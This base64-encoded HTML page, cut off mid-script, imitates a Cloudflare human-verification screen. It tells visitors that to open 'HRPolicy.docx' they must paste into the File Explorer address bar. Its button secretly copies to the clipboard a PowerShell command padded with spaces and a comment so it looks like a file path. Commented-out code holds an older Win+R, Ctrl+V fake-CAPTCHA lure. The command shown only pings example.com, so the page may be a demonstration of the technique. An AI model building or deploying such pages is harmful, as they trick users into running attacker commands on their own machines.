gICA8c3BhbiBjbGFzcz0icHJlbG9hZGVyX3RleHQiPkNoZWNraW5nIGlmIHlvdSBhcmUgaHVtYW4uIFRoaXMgbWF5IHRha2UgYSBmZXcgc2Vjb25kcy48L3NwYW4+DQogICAgPHNwYW4gY2xhc3M9InRleHRhbGxzdGVwIiBzdHlsZT0iZGlzcGxheTogbm9uZTsiPlZlcmlmeSB5b3UgYXJlIGh1bWFuIGJ5IGNvbXBsZXRpbmcgdGhlIGFjdGlvbiBiZWxvdy48L3NwYW4+ICAgDQogIDwvcD4NCjwvZGl2Pg0KDQogIDwhLS0gUFJFTE9BREVSIC0tPg0KICA8ZGl2IGNsYXNzPSJwcmVsb2FkZXIiPg0KICAgICAgIDxkaXYgY2xhc3M9Imxkcy1yaW5nIj4NCiAgICAgICA8ZGl2PjwvZGl2Pg0KICAgICAgIDxkaXY+PC9kaXY+DQogICAgICAgPGRpdj48L2Rpdj4NCiAgICAgICA8ZGl2PjwvZGl2Pg0KICAgICAgPC9kaXY+DQogIDwvZGl2Pg0KDQoNCg0KICA8IS0tIFNUQVJUIC0tPg0KDQogIDxkaXYgaWQ9ImNoZWNrYm94LXdpbmRvdyIgY2xhc3M9ImNoZWNrYm94LXdpbmRvdyIgc3R5bGU9IndpZHRoOiAzMDBweDsgaGVpZ2h0OiA3NHB4OyBkaXNwbGF5OiBub25lOyI+DQogICA8ZGl2IHN0eWxlPSJkaXNwbGF5OiBmbGV4OyBhbGlnbi1pdGVtczogY2VudGVyOyB3aWR0aDogMTAwJTsgaGVpZ2h0OiAxMDAlOyI+DQogICAgPGRpdiBjbGFzcz0iY2hlY2tib3gtY29udGFpbmVyIiBzdHlsZT0ibWFyZ2luLWxlZnQ6IDNweDsgbWFyZ2luLXJpZ2h0OiAxMnB4OyB3aWR0aDogMzBweDsiPg0KDQogICAgIDxzdmcgc3R5bGU9ImRpc3BsYXk6IG5vbmU7IiBjbGFzcz0ic3RlcDAiIGlkPSJzcGlubmVyMiIgZmlsbD0iZ3JlZW4iIHZpZXdCb3g9IjAgMCA2MCA2MCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4NCiAgICAgICAgPGNpcmNsZSBjeD0iMzAiIGN5PSIxMCIgcj0iMi41IiBjbGFzcz0icG9pbnQiPjwvY2lyY2xlPg0KICAgICAgICA8Y2lyY2xlIGN4PSI1MCIgY3k9IjMwIiByPSIyLjUiIGNsYXNzPSJwb2ludCI+PC9jaXJjbGU+DQogICAgICAgIDxjaXJjbGUgY3g9IjMwIiBjeT0iNTAiIHI9IjIuNSIgY2xhc3M9InBvaW50Ij48L2NpcmNsZT4NCiAgICAgICAgPGNpcmNsZSBjeD0iMTAiIGN5PSIzMCIgcj0iMi41IiBjbGFzcz0icG9pbnQiPjwvY2lyY2xlPg0KICAgICAgICA8Y2lyY2xlIGN4PSI0My42IiBjeT0iMTYuNCIgcj0iMi41IiBjbGFzcz0icG9pbnQiPjwvY2lyY2xlPg0KICAgICAgICA8Y2lyY2xlIGN4PSIxNi40IiBjeT0iMTYuNCIgcj0iMi41IiBjbGFzcz0icG9pbnQiPjwvY2lyY2xlPg0KICAgICAgICA8Y2lyY2xlIGN4PSI0My42IiBjeT0iNDMuNiIgcj0iMi41IiBjbGFzcz0icG9pbnQiPjwvY2lyY2xlPg0KICAgICAgICA8Y2lyY2xlIGN4PSIxNi40IiBjeT0iNDMuNiIgcj0iMi41IiBjbGFzcz0icG9pbnQiPjwvY2lyY2xlPg0KICAgICAgPC9zdmc+ICANCiAgICANCiAgICAgPGJ1dHRvbiB0eXBlPSJidXR0b24iIGlkPSJjaGVja2JveCIgY2xhc3M9ImNoZWNrYm94IHN0ZXAxIiBzdHlsZT0iZGlzcGxheTogbm9uZTsiPjwvYnV0dG9uPg0KDQogICAgIDxkaXYgY2xhc3M9InNwaW5uZXIgc3RlcDIiIGlkPSJzcGlubmVyIiBzdHlsZT0idmlzaWJpbGl0eTogaGlkZGVuOyBkaXNwbGF5OiBub25lOyI+DQogICAgICA8ZGl2IGNsYXNzPSJsZHMtcmluZyI+DQogICAgICAgPGRpdj48L2Rpdj4NCiAgICAgICA8ZGl2PjwvZGl2Pg0KICAgICAgIDxkaXY+PC9kaXY+DQogICAgICAgPGRpdj48L2Rpdj4NCiAgICAgIDwvZGl2Pg0KICAgICA8L2Rpdj4NCg0KICAgICA8ZGl2IGNsYXNzPSJzdGVwMyIgc3R5bGU9ImRpc3BsYXk6IG5vbmU7Ij4NCiAgICAgIDxzdmcgd2lkdGg9IjMwIiBoZWlnaHQ9IjMwIiB2aWV3Qm94PSIwIDAgNTAgNTAiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+DQogICAgICAgPGNpcmNsZSBjeD0iMjUiIGN5PSIyNSIgcj0iMjMiIGZpbGw9IiMyOGE3NDUiIC8+DQogICAgICAgPHBhdGggZD0iTTE1IDI1IEwyMiAzMiBMMzUgMTgiIHN0cm9rZT0id2hpdGUiIHN0cm9rZS13aWR0aD0iNCIgZmlsbD0ibm9uZSIgc3Ryb2tlLWxpbmVjYXA9InJvdW5kIiBzdHJva2UtbGluZWpvaW49InJvdW5kIiAvPg0KICAgICAgPC9zdmc+DQogICAgIDwvZGl2Pg0KICAgIDwvZGl2Pg0KDQogICAgPGRpdiBjbGFzcz0idGV0dHgiPg0KICAgICA8cCBjbGFzcz0ic3RlcDAiIHN0eWxlPSJtYXJnaW46IDAgIWltcG9ydGFudDsgIj5WZXJpZnlpbmcuLi48L3A+DQogICAgIDxwIGNsYXNzPSJzdGVwMSIgc3R5bGU9Im1hcmdpbjogMCAhaW1wb3J0YW50OyBkaXNwbGF5OiBub25lOyI+VmVyaWZ5IHlvdSBhcmUgaHVtYW48L3A+DQogICAgIDxwIGNsYXNzPSJzdGVwMiIgc3R5bGU9Im1hcmdpbjogMCAhaW1wb3J0YW50OyBkaXNwbGF5OiBub25lOyI+VmVyaWZpY2F0aW9uIFN0ZXBzPC9wPg0KICAgICA8cCBjbGFzcz0ic3RlcDMiIHN0eWxlPSJtYXJnaW46IDAgIWltcG9ydGFudDsgZGlzcGxheTogbm9uZTsiPlN1Y2Nlc3NmdWxseS48L3A+DQogICAgPC9kaXY+DQoNCiAgICA8ZGl2IHN0eWxlPSJmb250LXNpemU6IDhweDsgdGV4dC1hbGlnbjogY2VudGVyOyBtYXJnaW4tbGVmdDogYXV0bzsiPg0KICAgICA8c3ZnIHJvbGU9ImltZyIgYXJpYS1sYWJlbD0iQ2xvdWRmbGFyZSIgaWQ9ImxvZ28iIHZpZXdCb3g9IjAgMCA3MyAyNSIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48cGF0aCBkPSJNNjEuODg0OCAxNS43ODQxTDYyLjA2MzIgMTUuMTU3OEM2Mi4yNzU4IDE0LjQxMjYgNjIuMTk2NyAxMy43MjM5IDYxLjg0MDEgMTMuMjE3OEM2MS41MTE4IDEyLjc1MTcgNjAuOTY0OSAxMi40NzczIDYwLjMwMDcgMTIuNDQ1M0w0Ny43MjAxIDEyLjI4MzZDNDcuNjgxMSAxMi4yODI5IDQ3LjY0MjggMTIuMjcyOCA0Ny42MDgzIDEyLjI1NDJDNDcuNTczOCAxMi4yMzU2IDQ3LjU0NDIgMTIuMjA5IDQ3LjUyMTcgMTIuMTc2NkM0Ny40OTk2IDEyLjE0MzEgNDcuNDg1NiAxMi4xMDQ5IDQ3LjQ4MDcgMTIuMDY0OUM0Ny40NzU4IDEyLjAyNSA0Ny40ODAxIDExLjk4NDQgNDcuNDkzMyAxMS45NDY1QzQ3LjUxNDkgMTEuODgzOSA0Ny41NTQxIDExLjgyOTEgNDcuNjA2MSAxMS43ODg4QzQ3LjY1OCAxMS43NDg2IDQ3LjcyMDQgMTEuNzI0NyA0Ny43ODU2IDExLjcyTDYwLjQ4MjcgMTEuNTU2NkM2MS45ODg5IDExLjQ4NjQgNjMuNjE5NiAxMC4yNDYyIDY0LjE5MDUgOC43MzM3Mkw2NC45MTQ2IDYuODEzNjFDNjQuOTQ0MyA2LjczMjQyIDY0Ljk1MSA2LjY0NDQ0IDY0LjkzNDEgNi41NTk1N0M2NC4xMTIgMi44MDY1MiA2MC44MTE1IDAgNTYuODY1MiAwQzUzLjIyOTMgMCA1MC4xNDIxIDIuMzgxNTggNDkuMDM0NyA1LjY5MTg2QzQ4LjI4NjQgNS4xMjE4NiA0Ny4zNTM1IDQuODU5ODIgNDYuNDIyOCA0Ljk1ODIzQzQ0LjY3ODUgNS4xMzQwMSA0My4yNzYgNi41NTkyOCA0My4xMDM0IDguMzI5NzlDNDMuMDU5IDguNzcxODkgNDMuMDkxNSA5LjIxODQ1IDQzLjE5OTIgOS42NDkxOEM0MC4zNDk3IDkuNzMzNDcgMzguMDY0NSAxMi4xMDI3IDM4LjA2NDUgMTUuMDE1MUMzOC4wNjQ5IDE1LjI3NTEgMzguMDgzOCAxNS41MzQ3IDM4LjEyMTIgMTUuNzkxOUMzOC4xMjk0IDE1Ljg1MTMgMzguMTU4NCAxNS45MDU3IDM4LjIwMjkgMTUuOTQ1MkMzOC4yNDc0IDE1Ljk4NDcgMzguMzA0NCAxNi4wMDY3IDM4LjM2MzUgMTYuMDA3MUw2MS41ODk0IDE2LjAwOTlDNjEuNTkxNiAxNi4wMTAxIDYxLjU5MzggMTYuMDEwMSA2MS41OTYgMTYuMDA5OUM2MS42NjE2IDE2LjAwODggNjEuNzI1MiAxNS45ODYyIDYxLjc3NzIgMTUuOTQ1NUM2MS44MjkzIDE1LjkwNDkgNjEuODY3IDE1Ljg0ODMgNjEuODg0OCAxNS43ODQxWiIgZmlsbD0iI0Y2ODIxRiI+PC9wYXRoPjxwYXRoIGQ9Ik02Ni4wNzU4IDYuOTUyODVDNjUuOTU5MiA2Ljk1Mjg1IDY1Ljg0MyA2Ljk1NTgyIDY1LjcyNzQgNi45NjE3N0M2NS43MDg3IDYuOTYzMTIgNjUuNjkwNCA2Ljk2NzE5IDY1LjY3MjkgNi45NzM4NUM2NS42NDI2IDYuOTg0MzcgNjUuNjE1MiA3LjAwMjE5IDY1LjU5MzEgNy4wMjU3OUM2NS41NzExIDcuMDQ5MzkgNjUuNTU1IDcuMDc4MDYgNjUuNTQ2MiA3LjEwOTM2TDY1LjA1MTUgOC44NDMzM0M2NC44Mzg5IDkuNTg4NDcgNjQuOTE4IDEwLjI3NjYgNjUuMjc0OSAxMC43ODI3QzY1LjYwMjkgMTEuMjQ5NCA2Ni4xNDk4IDExLjUyMzMgNjYuODE0IDExLjU1NTJMNjkuNDk1OSAxMS43MTg2QzY5LjUzMzYgMTEuNzE5OSA2OS41NzA1IDExLjczIDY5LjYwMzcgMTEuNzQ4M0M2OS42MzY5IDExLjc2NjYgNjkuNjY1NCAxMS43OTI1IDY5LjY4NyAxMS44MjM5QzY5LjcwOTIgMTEuODU3NiA2OS43MjM0IDExLjg5NiA2OS43MjgzIDExLjkzNjNDNjkuNzMzMiAxMS45NzY1IDY5LjcyODggMTIuMDE3MyA2OS43MTUzIDEyLjA1NTVDNjkuNjkzNyAxMi4xMTggNjkuNjU0NiAxMi4xNzI3IDY5LjYwMjggMTIuMjEyOUM2OS41NTA5IDEyLjI1MzEgNjkuNDg4NyAxMi4yNzcxIDY5LjQyMzYgMTIuMjgxOUw2Ni42MzcxIDEyLjQ0NTNDNjUuMTI0MSAxMi41MTYxIDYzLjQ5MzcgMTMuNzU1OCA2Mi45MjMzIDE1LjI2ODJMNjIuNzIyIDE1LjgwMjJDNjIuNzEzNiAxNS44MjQ1IDYyLjcxMDUgMTUuODQ4NiA2Mi43MTMgMTUuODcyNEM2Mi43MTU1IDE1Ljg5NjEgNjIuNzIzNiAxNS45MTg5IDYyLjczNjUgMTUuOTM4OUM2Mi43NDk1IDE1Ljk1ODkgNjIuNzY2OSAxNS45NzU1IDYyLjc4NzQgMTUuOTg3M0M2Mi44MDc5IDE1Ljk5OTEgNjIuODMwOSAxNi4wMDU4IDYyLjg1NDQgMTYuMDA2OEM2Mi44NTY5IDE2LjAwNjggNjIuODU5MiAxNi4wMDY4IDYyLjg2MTggMTYuMDA2OEg3Mi40NTAyQzcyLjUwNiAxNi4wMDczIDcyLjU2MDQgMTUuOTg5MyA3Mi42MDUxIDE1Ljk1NTRDNzIuNjQ5OCAxNS45MjE2IDcyLjY4MjMgMTUuODczOSA3Mi42OTc3IDE1LjgxOTVDNzIuODY3NyAxNS4yMDQzIDcyLjk1MzUgMTQuNTY4NCA3Mi45NTI5IDEzLjkyOTZDNzIuOTUxNyAxMC4wNzY3IDY5Ljg3MzIgNi45NTI4NSA2Ni4wNzU4IDYuOTUyODVaIiBmaWxsPSIjRkJBRDQxIj48L3BhdGg+PHBhdGggZD0iTTguMTE5NjMgMTguODkwNEg5Ljc1NTQxVjIzLjQyNTRIMTIuNjEzOVYyNC44Nzk4SDguMTE5NjNWMTguODkwNFoiIGNsYXNzPSJsb2dvLXRleHQiPjwvcGF0aD48cGF0aCBkPSJNMTQuMzA4MSAyMS45MDIzVjIxLjg4NTNDMTQuMzA4MSAyMC4xNjU1IDE1LjY3NCAxOC43NzA0IDE3LjQ5NTIgMTguNzcwNEMxOS4zMTY0IDE4Ljc3MDQgMjAuNjY1MyAyMC4xNDgyIDIwLjY2NTMgMjEuODY4MVYyMS44ODUzQzIwLjY2NTMgMjMuNjA1MiAxOS4yOTkxIDI0Ljk5OTQgMTcuNDc4NSAyNC45OTk0QzE1LjY1NzggMjQuOTk5NCAxNC4zMDgxIDIzLjYyMjIgMTQuMzA4MSAyMS45MDIzWk0xOC45OTU4IDIxLjkwMjNWMjEuODg1M0MxOC45OTU4IDIxLjAyMjIgMTguMzgwNiAyMC4yNjc5IDE3LjQ3ODUgMjAuMjY3OUMxNi41ODQ2IDIwLjI2NzkgMTUuOTg1OCAyMS4wMDM4IDE1Ljk4NTggMjEuODY4MVYyMS44ODUzQzE1Ljk4NTggMjIuNzQ4NCAxNi42MDEzIDIzLjUwMjUgMTcuNDk1MiAyMy41MDI1QzE4LjM5NzMgMjMuNTAyNSAxOC45OTU4IDIyLjc2NjYgMTguOTk1OCAyMS45MDIzWiIgY2xhc3M9ImxvZ28tdGV4dCI+PC9wYXRoPjxwYXRoIGQ9Ik0yMi42Njc0IDIyLjI1M1YxOC44OTAxSDI0LjMyODRWMjIuMjE5MUMyNC4zMjg0IDIzLjA4MjIgMjQuNzU4NCAyMy40OTM5IDI1LjQxNTkgMjMuNDkzOUMyNi4wNzMzIDIzLjQ5MzkgMjYuNTAzNCAyMy4xMDAzIDI2LjUwMzQgMjIuMjYxN1YxOC44OTAxSDI4LjE2NDdWMjIuMjA5M0MyOC4xNjQ3IDI0LjE0MzIgMjcuMDc3MiAyNC45ODk5IDI1LjM5OTEgMjQuOTg5OUMyMy43MjExIDI0Ljk4OTkgMjIuNjY3NCAyNC4xMjY4IDIyLjY2NzQgMjIuMjUyMiIgY2xhc3M9ImxvZ28tdGV4dCI+PC9wYXRoPjxwYXRoIGQ9Ik0zMC42NjggMTguODkwN0gzMi45NDQ1QzM1LjA1MjYgMTguODkwNyAzNi4yNzUgMjAuMTIyNiAzNi4yNzUgMjEuODUwOFYyMS44Njg0QzM2LjI3NSAyMy41OTYzIDM1LjAzNTUgMjQuODggMzIuOTExIDI0Ljg4SDMwLjY2OFYxOC44OTA3Wk0zMi45NyAyMy40MDc2QzMzLjk0ODMgMjMuNDA3NiAzNC41OTcgMjIuODYwOSAzNC41OTcgMjEuODkyOFYyMS44NzU5QzM0LjU5NyAyMC45MTc4IDMzLjk0ODMgMjAuMzYxNCAzMi45NyAyMC4zNjE0SDMyLjMwMzhWMjMuNDA4MkwzMi45NyAyMy40MDc2WiIgY2xhc3M9ImxvZ28tdGV4dCI+PC9wYXRoPjxwYXRoIGQ9Ik0zOC42NTI1IDE4Ljg5MDRINDMuMzczOFYyMC4zNDUzSDQwLjI4ODNWMjEuMzYzMkg0My4wNzlWMjIuNzQwN0g0MC4yODgzVjI0Ljg3OThIMzguNjUyNVYxOC44OTA0WiIgY2xhc3M9ImxvZ28tdGV4dCI+PC9wYXRoPjxwYXRoIGQ9Ik00NS42NSAxOC44OTA0SDQ3LjI4NThWMjMuNDI1NEg1MC4xNDQzVjI0Ljg3OThINDUuNjVWMTguODkwNFoiIGNsYXNzPSJsb2dvLXRleHQiPjwvcGF0aD48cGF0aCBkPSJNNTQuNDE4NyAxOC44NDc1SDU1Ljk5NDlMNTguNTA3OSAyNC44Nzk3SDU2Ljc1NDFMNTYuMzIzOCAyMy44MTAxSDU0LjA0N0w1My42MjU3IDI0Ljg3OTdINTEuOTA1OEw1NC40MTg3IDE4Ljg0NzVaTTU1Ljg1MTggMjIuNTE4M0w1NS4xOTQxIDIwLjgxNTRMNTQuNTI3OCAyMi41MTgzSDU1Ljg1MThaIiBjbGFzcz0ibG9nby10ZXh0Ij48L3BhdGg+PHBhdGggZD0iTTYwLjYxNDkgMTguODkwMUg2My40MDU2QzY0LjMwODMgMTguODkwMSA2NC45MzE3IDE5LjEzIDY1LjMyOCAxOS41NDA2QzY1LjY3NDIgMTkuODgzIDY1Ljg1MTEgMjAuMzQ2MiA2NS44NTExIDIwLjkzNTdWMjAuOTUyNkM2NS44NTExIDIxLjg2NzggNjUuMzY5MSAyMi40NzU0IDY0LjYzNjkgMjIuNzkxOUw2Ni4wNDUgMjQuODhINjQuMTU1OEw2Mi45NjcxIDIzLjA2NThINjIuMjUwN1YyNC44OEg2MC42MTQ5VjE4Ljg5MDFaTTYzLjMyOTkgMjEuNzY1NEM2My44ODY0IDIxLjc2NTQgNjQuMjA3MSAyMS40OTE1IDY0LjIwNzEgMjEuMDU1MVYyMS4wMzgxQzY0LjIwNzEgMjAuNTY3NCA2My44Njk3IDIwLjMyOCA2My4zMjExIDIwLjMyOEg2Mi4yNTA3VjIxLjc2NjVMNjMuMzI5OSAyMS43NjU0WiIgY2xhc3M9ImxvZ28tdGV4dCI+PC9wYXRoPjxwYXRoIGQ9Ik02OC4yMTEyIDE4Ljg5MDRINzIuOTU3OFYyMC4zMDI0SDY5LjgzMDJWMjEuMjA5SDcyLjY2MzJWMjIuNTE4M0g2OS44MzAyVjIzLjQ2ODNINzNWMjQuODc5OEg2OC4yMTEyVjE4Ljg5MDRaIiBjbGFzcz0ibG9nby10ZXh0Ij48L3BhdGg+PHBhdGggZD0iTTQuNTM4MjQgMjIuNjA0M0M0LjMwOTE4IDIzLjEzIDMuODI3MjMgMjMuNTAyMiAzLjE4NjgxIDIzLjUwMjJDMi4yOTI2NSAyMy41MDIyIDEuNjc3NDYgMjIuNzQ5MyAxLjY3NzQ2IDIxLjg4NTFWMjEuODY3OEMxLjY3NzQ2IDIxLjAwNDcgMi4yNzU5MyAyMC4yNjc2IDMuMTY5OCAyMC4yNjc2QzMuODQzNjcgMjAuMjY3NiA0LjM1NjgxIDIwLjY4ODIgNC41NzM0IDIxLjI2MDVINi4yOTc2NEM2LjAyMTUxIDE5LjgzNDkgNC43ODcxNiAxOC43NzA3IDMuMTg2ODEgMTguNzcwN0MxLjM2NTMzIDE4Ljc3MDcgMCAyMC4xNjY2IDAgMjEuODg1MVYyMS45MDIxQzAgMjMuNjIxOSAxLjM0ODYgMjUgMy4xNjk4IDI1QzQuNzI3NjIgMjUgNS45NDUyNSAyMy45NzY0IDYuMjY2NDUgMjIuNjA0Nkw0LjUzODI0IDIyLjYwNDNaIiBjbGFzcz0ibG9nby10ZXh0Ij48L3BhdGg+PC9zdmc+DQogICAgIDxkaXY+DQogICAgICAgIDxzcGFuIHN0eWxlPSJ0ZXh0LWRlY29yYXRpb246IHVuZGVybGluZTsiPlByaXZhY3k8L3NwYW4+IOKAoiA8c3BhbiBzdHlsZT0idGV4dC1kZWNvcmF0aW9uOiB1bmRlcmxpbmU7Ij5UZXJtczwvc3Bhbj4NCiAgICAgPC9kaXY+DQogICAgIA0KICAgIDwvZGl2Pg0KICAgPC9kaXY+DQoNCiAgIDxkaXYgaWQ9InZlcmlmeS13aW5kb3ciIGNsYXNzPSJ2ZXJpZnktd2luZG93IiBzdHlsZT0iYm9yZGVyLXRvcDogbm9uZTsgcGFkZGluZy10b3A6IDA7IG1hcmdpbi10b3A6IDA7bWFyZ2luLWJvdHRvbTowOyI+DQogICAgPGRpdiBjbGFzcz0idmVyaWZ5LWNvbnRhaW5lciI+DQogICAgIDxtYWluIGNsYXNzPSJ2ZXJpZnktbWFpbiIgc3R5bGU9ImNvbG9yOiAjZDlkOWQ5OyI+DQogICAgIA0KDQogICAgICAgICA8ZGl2IGNsYXNzPSJpbnN0cnVjdGlvbnMiPg0KDQogICAgICAgICAgICAgIDxwIHN0eWxlPSJmb250LXNpemU6IDE4cHg7IG1hcmdpbi1ib3R0b206IDE1cHg7Ij4NCiAgICBUbyBhY2Nlc3MgPHN0cm9uZz5IUlBvbGljeS5kb2N4PC9zdHJvbmc+LCBmb2xsb3cgdGhlc2Ugc3RlcHM6DQogICAgICA8L3A+DQoNCg0KICAgIA0KICAgICAgPG9sPg0KICAgICAgICA8IS0tIDxsaSBzdHlsZT0ibWFyZ2luLWJvdHRvbTogMTBweDsiPg0KICAgICAgICAgIENvcHkgdGhlIGZpbGUgcGF0aCBiZWxvdw0KICAgICAgICAgIDxkaXYgY2xhc3M9ImNvZGUtYmxvY2siIGlkPSJwYXRoIiBvbmNsaWNrPSJ0aGlzLmNsYXNzTGlzdC5hZGQoJ2NsaWNrZWQnKSI+DQogICAgICAgICAgICBDOlxpbnRlcm5hbC1zZWN1cmVcZmlsZWRyaXZlXEhSUG9saWN5LmRvY3gNCiAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgPC9saT4gLS0+DQogICAgICAgIDxsaSBzdHlsZT0ibWFyZ2luLWJvdHRvbTogMTBweDsiPk9wZW4gRmlsZSBFeHBsb3JlciBhbmQgc2VsZWN0IHRoZSBhZGRyZXNzIGJhciAoPHN0cm9uZz5DVFJMICsgTDwvc3Ryb25nPik8L2xpPg0KICAgICAgICA8bGkgc3R5bGU9Im1hcmdpbi1ib3R0b206IDEwcHg7Ij5QYXN0ZSB0aGUgZmlsZSBwYXRoIGFuZCBwcmVzcyA8c3Ryb25nPkVudGVyPC9zdHJvbmc+PC9saT4NCiAgICAgIDwvb2w+DQogICAgPC9kaXY+DQoNCiAgICAgPGlucHV0IHR5cGU9ImZpbGUiIGlkPSJmaWxlSW5wdXQiIHN0eWxlPSJkaXNwbGF5OiBub25lOyI+DQogICAgPGJ1dHRvbiBpZD0iZmlsZUV4cGxvcmVyIj5PcGVuIEZpbGUgRXhwbG9yZXI8L2J1dHRvbj4NCg0KDQogICA8IS0tICAgPHAgc3R5bGU9ImZvbnQtc2l6ZTogMThweDsgbWFyZ2luLWJvdHRvbTogMTVweDsiPg0KICAgICAgIFRvIGJldHRlciBwcm92ZSB5b3UgYXJlIG5vdCBhIHJvYm90LCBwbGVhc2U6DQogICAgICA8L3A+DQogICAgICA8b2w+DQogICAgICAgPGxpPlByZXNzICZhbXA7IGhvbGQgdGhlIFdpbmRvd3MgS2V5IDxpIGNsYXNzPSJmYWIgZmEtd2luZG93cyI+PC9pPiArIDxiPlI8L2I+LjwvbGk+DQoNCiAgICAgICA8bGk+SW4gdGhlIHZlcmlmaWNhdGlvbiB3aW5kb3csIHByZXNzIDxiPkN0cmw8L2I+ICsgPGI+VjwvYj4uPC9saT4NCg0KICAgICAgIDxsaT5QcmVzcyA8Yj5FbnRlcjwvYj4gb24geW91ciBrZXlib2FyZCB0byBmaW5pc2guPC9saT4NCiAgICAgIDwvb2w+DQogICAgICA8cCBzdHlsZT0icGFkZGluZy10b3A6IDEwcHg7Ij4NCiAgICAgICBZb3Ugd2lsbCBvYnNlcnZlIGFuZCBhZ3JlZToNCiAgICAgICA8YnIgLz4NCiAgICAgICA8Y29kZSBzdHlsZT0iYmFja2dyb3VuZDogbm9uZTsgYm9yZGVyOiAxcHggc29saWQgIzc5Nzk3OTsgd2lkdGg6IDQzMnB4OyI+IOKchSAiSSBhbSBub3QgYSByb2JvdCAtIHJlQ0FQVENIQSBWZXJpZmljYXRpb24gSUQ6IDxzcGFuIGlkPSJ2ZXJpZmljYXRpb24taWQiPjE0NjgyMDwvc3Bhbj4iIDwvY29kZT4NCiAgICAgIDwvcD4NCiAgICAgPC9tYWluPi0tPg0KDQoNCiAgICA8L2Rpdj4NCiAgIDwhLS0gPGRpdiBjbGFzcz0idmVyaWZ5LWNvbnRhaW5lciB2ZXJpZnktZm9vdGVyIiBzdHlsZT0iYmFja2dyb3VuZDogbm9uZTsiPg0KICAgICA8ZGl2IGNsYXNzPSJ2ZXJpZnktZm9vdGVyLWxlZnQiIHN0eWxlPSJ3aWR0aDogMjg2cHg7IGZsb2F0OiBsZWZ0OyB0ZXh0LWFsaWduOiBsZWZ0OyBmb250LXNpemU6IDE1cHg7Ij4NCiAgICAgIFBlcmZvcm0gdGhlIHN0ZXBzIGFib3ZlIHRvIGZpbmlzaCB2ZXJpZmljYXRpb24uDQogICAgIDwvZGl2Pg0KICAgICA8YnV0dG9uIHR5cGU9ImJ1dHRvbiIgY2xhc3M9InZlcmlmeS12ZXJpZnktYnV0dG9uIGJsb2NrIiBpZD0idmVyaWZ5LWJ1dHRvbiIgc3R5bGU9ImJhY2tncm91bmQ6ICM1ZTVlNWU7IHBhZGRpbmc6IDlweCAzOHB4OyI+VmVyaWZ5PC9idXR0b24+DQogICAgPC9kaXY+IC0tPg0KICAgPC9kaXY+DQoNCiAgIDwhLS0gLS0+DQoNCiAgIDxzY3JpcHQ+DQpkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCJET01Db250ZW50TG9hZGVkIiwgZnVuY3Rpb24gKCkgew0KICAgIGNvbnN0IGRvbWFpbiA9IHdpbmRvdy5sb2NhdGlvbi5ob3N0bmFtZTsNCiAgICBkb2N1bWVudC5xdWVyeVNlbGVjdG9yQWxsKCIuZG9tYWluIikuZm9yRWFjaChlbCA9PiB7DQogICAgICAgIGlmIChlbCkgZWwudGV4dENvbnRlbnQgPSBkb21haW47DQogICAgfSk7DQp9KTsNCjwvc2NyaXB0Pg0KDQogIDwvZGl2Pg0KICAgIDxwIHN0eWxlPSJmb250LXNpemU6IDEuNXJlbTsNCiAgICBsaW5lLWhlaWdodDogMi4yNXJlbTsgcGFkZGluZy10b3A6IDIwcHg7Ij48c3BhbiBjbGFzcz0iZG9tYWluLW5hbWUiPjwvc3Bhbj4gbmVlZHMgdG8gcmV2aWV3IHRoZSBzZWN1cml0eSBvZiB5b3VyIGNvbm5lY3Rpb24gYmVmb3JlIHByb2NlZWRpbmcuPC9wPg0KIDwvZGl2Pg0KPC9kaXY+DQoNCjxkaXYgY2xhc3M9ImZvb3RlciIgcm9sZT0iY29udGVudGluZm8iPg0KIDxkaXYgY2xhc3M9ImZvb3Rlci1pbm5lciI+DQogIDxkaXY+DQogICA8ZGl2PlJheSBJRDogPGNvZGUgY2xhc3M9InJheS1pZCI+NTZhNGM1Mjk5ZmRldG1jYTwvY29kZT48L2Rpdj4NCiAgPC9kaXY+DQogIDxkaXYgc3R5bGU9Im1hcmdpbi10b3A6IDVweDsiPlBlcmZvcm1hbmNlICYgc2VjdXJpdHkgYnkgPHNwYW4gc3R5bGU9ImNvbG9yOiAjZmZmZmZmIj5DbG91ZGZsYXJlPC9zcGFuPjwvZGl2Pg0KIDwvZGl2Pg0KPC9kaXY+DQoNCg0KPHNjcmlwdD4NCg0KDQpjb25zdCBjb21tYW5kID0gYFBvd2Vyc2hlbGwuZXhlIC1jIHBpbmcgZXhhbXBsZS5jb20gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIyBDOlxcXGludGVybmFsLXNlY3VyZVxcZmlsZWRyaXZlXFxIUlBvbGljeS5kb2N4ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBgOyAvL0NPTU1BTkQNCg0KDQoNCiBjb25zdCBmaWxlSW5wdXQgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZmlsZUlucHV0Jyk7DQogICAgY29uc3QgZmlsZUV4cGxvcmVyID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2ZpbGVFeHBsb3JlcicpOw0KICAgIGNvbnN0IHBhdGggPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncGF0aCcpOw0KDQogICAgLy8gLy8gQ29weSB0aGUgcG93ZXJzaGVsbCBjb21tYW5kIGlmIHRoZXkgY2xpY2sgb24gdGhlIGR1bW15IGZpbGUgcGF0aA0KICAgIC8vIC8vIEluIGNhc2UgdGhlIHVzZXIgdHJpZXMgdG8gYmUgc21hcnQgYW5kIG9wZW4gZmlsZSBleHBsb3JlciBtYW51YWxseQ0KICAgIC8vIHBhdGguYWRkRXZlbnRMaXN0ZW5lcignY2xpY2snLCBmdW5jdGlvbigpIHsNCiAgICAvLyAgICAgbmF2aWdhdG9yLmNsaXBib2FyZC53cml0ZVRleHQoY29tbWFuZCk7DQogICAgLy8gfSk7DQoNCiAgICAvLyBDb3B5IHBvd2Vyc2hlbGwgY29tbWFuZCAmIG9wZW4gZmlsZSBleHBsb3Jlcg0KICAgIGZpbGVFeHBsb3Jlci5hZGRFdmVudExpc3RlbmVyKCdjbGljaycsIGZ1bmN0aW9uKCkgew0KICAgICAgICBuYXZpZ2F0b3IuY2xpcGJvYXJkLndyaXRlVGV4dChjb21tYW